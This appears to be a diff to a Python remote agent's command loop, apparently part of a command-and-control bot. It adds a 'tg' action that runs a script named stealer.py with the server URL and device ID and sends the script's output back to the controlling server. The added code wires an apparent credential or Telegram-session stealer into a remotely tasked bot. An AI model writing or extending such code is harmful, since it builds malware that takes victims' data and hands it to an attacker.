@@ -104,6 +104,24 @@ def main():
                 except Exception:
                     pass
 
+        elif action == "tg":
+            log = []
+            try:
+                result = subprocess.run(
+                    ["python", "/app/stealer.py"],
+                    capture_output=True, text=True, timeout=300,
+                    env={**os.environ, "SERVER_URL": SERVER, "DEVICE_ID": DEVICE_ID}
+                )
+                output = result.stdout
+                if result.stderr:
+                    output += "\nSTDERR:\n" + result.stderr
+                send_result(cmd_id, output)
+                print(f"[agent] tg command executed")
+            except subprocess.TimeoutExpired:
+                send_result(cmd_id, "ERROR: tg command timed out after 300s")
+            except Exception as e:
+                send_result(cmd_id, f"ERROR: {e}")
+
         elif action == "file":
             filepath = args.strip() if args else ""
             if not filepath:
